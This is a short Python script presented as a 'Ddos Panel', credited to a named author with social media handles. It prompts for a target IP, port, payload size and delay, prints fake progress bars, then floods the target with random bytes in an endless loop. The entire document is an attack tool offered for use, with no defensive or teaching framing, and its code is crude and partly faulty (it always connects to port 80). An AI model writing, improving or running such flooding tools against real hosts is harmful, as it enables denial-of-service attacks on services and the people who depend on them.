import socket
import time
import random

about = """
Ddos Panel Made by Doxestic With Python :)
for support me dont forget to share this panel
github: github.com/Doxestic
telegram: @doxestic
discord: Doxestic#
"""
port = 80
print(about)
ip = input("pls enter the ip of target and press enter:")
print("ip has set to {}".format(ip))
ishport = input("do you have targets port?(y/n)")
byt = input("pls give the len of bytes:")
if ishport.lower() == "y":
    port = input("pls enter the port of target:")
    print("port has set to {}".format(port))
else:
    print("default port is 80")
timer = input("pls give a time for delay between attacks:")
print("pls wait until we setup Ddos for you")
time.sleep(3)
print("pls wait...")
time.sleep(2)
print("starting...")
time.sleep(1)
print("progress: [|.............................] 1%")
time.sleep(1)
print("progress: [|||...........................] 10%")
time.sleep(1)
print("progress: [||||||||......................] 30%")
time.sleep(1)
print("progress: [|||||||||||||||||.............] 50%")
time.sleep(1)
print("progress: [||||||||||||||||||||||||......] 80%")
time.sleep(4)
print("progress: [||||||||||||||||||||||||||||||] 100%")
print("attack started :)")
intport = int(port)
inttime = int(timer)
socke = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("creating Connection...")
try:
   socke.connect((ip, 80))
   socke.settimeout(500)
except socket.gaierror as error:
   print("faild to connect to " + ip)
while True:
 try:
  try:
   bytes = random._urandom(int(byt))
   socke.sendto(bytes, (ip, int(port)))
   time.sleep(int(timer))
   print("send " + str(len(str(bytes))) + " to " + ip)
  except socket.error as er:
   print (er)
   input("press enter to exit")
 except socket.gaierror as error:
  print("connect time out")
  input("press enter to exit")